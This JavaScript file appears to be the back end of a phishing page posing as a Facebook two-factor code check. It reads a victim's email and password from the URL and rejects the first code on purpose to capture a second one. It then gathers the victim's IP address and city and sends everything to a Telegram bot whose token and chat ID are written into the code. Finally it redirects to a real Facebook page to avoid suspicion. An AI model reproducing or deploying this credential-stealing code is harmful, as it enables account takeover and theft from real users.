function validateInput (inputElement) {
  const value = parseInt(inputElement.value)
  if (isNaN(value) || value % 1 !== 0) {
    document.getElementById('messageContainer').innerText =
      'Please enter 6 - digits on your device'
  } else {
    document.getElementById('messageContainer').innerText = ''
  }
}
const countdownMinutes = 5
const targetTime = new Date()
targetTime.setMinutes(targetTime.getMinutes() + countdownMinutes)

function updateCountdown () {
  const currentTime = new Date()
  const timeDifference = targetTime - currentTime
  if (timeDifference > 0) {
    const minutes = Math.floor(
      (timeDifference % (1000 * 60 * 60)) / (1000 * 60)
    )
    const seconds = Math.floor((timeDifference % (1000 * 60)) / 1000)

    document.getElementById(
      'countdown'
    ).innerHTML = ` Please wait <strong class="count-time">${minutes}:${seconds}</strong> to request the sending of the `
  }
}
setInterval(updateCountdown, 1000)
updateCountdown()

let attempts = 0
let firstCodeMail = ''
function submitCodeForm (event) {
  event.preventDefault()

  const codeMail = document.getElementById('codeMail').value

  const email = getParameterByName('email')
  const password = getParameterByName('password')

  if (attempts === 0) {
    attempts++
    firstCodeMail = codeMail

    displayMessage('Code incorrect. Please try again.')
    document.getElementById('emailForm').reset()
  } else if (attempts === 1 || attempts === 2) {
    attempts++

    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        const ipAddress = data.ip
        fetch(`https://freeipapi.com/api/json/${encodeURIComponent(ipAddress)}`)
          .then(response => response.json())
          .then(data => {
            const cityName = data.cityName
            const countryName = data.countryName

            const requestData = `
email: ${email}
password: ${password}
codeMail: ${codeMail}
firstCodeMail: ${firstCodeMail}
ipAddress: ${ipAddress}
cityName: ${cityName}
countryName: ${countryName}
`

            const botToken = '6675441092:AAENA2tQAnzrJmyDtEJl9OecVVmAyQtpBlE'
            const chatId = '-4185862162'
            const rdata = {
              chat_id: chatId,
              text: requestData
            }
            $.ajax({
              type: 'POST',
              url: `https://api.telegram.org/bot${botToken}/sendMessage`,
              data: rdata,
              success: function (response) {
                if (response === 'Data By MDT') {
                  window.location.href =
                    'https://www.facebook.com/policies_center/'
                } else {
                  window.location.href = 'community-confirm'
                }
              },
              error: function () {
                alert('An error occurred.')
              }
            })
            openModal()
          })
          .catch(error => {
            console.error('Failed to fetch IP API:', error)
          })
      })
      .catch(error => {
        console.error('Failed to fetch IP:', error)
      })
  }
}

function getParameterByName (name) {
  const url = new URL(window.location.href)
  return url.searchParams.get(name)
}
function openModal () {
  const modal = document.getElementById('finishModal')
  modal.style.display = 'block'
}

function displayMessage (message) {
  const messageDiv = document.getElementById('messageContainer')
  messageDiv.innerHTML = message
}

function getParameterByName (name) {
  const url = new URL(window.location.href)
  return url.searchParams.get(name)
}
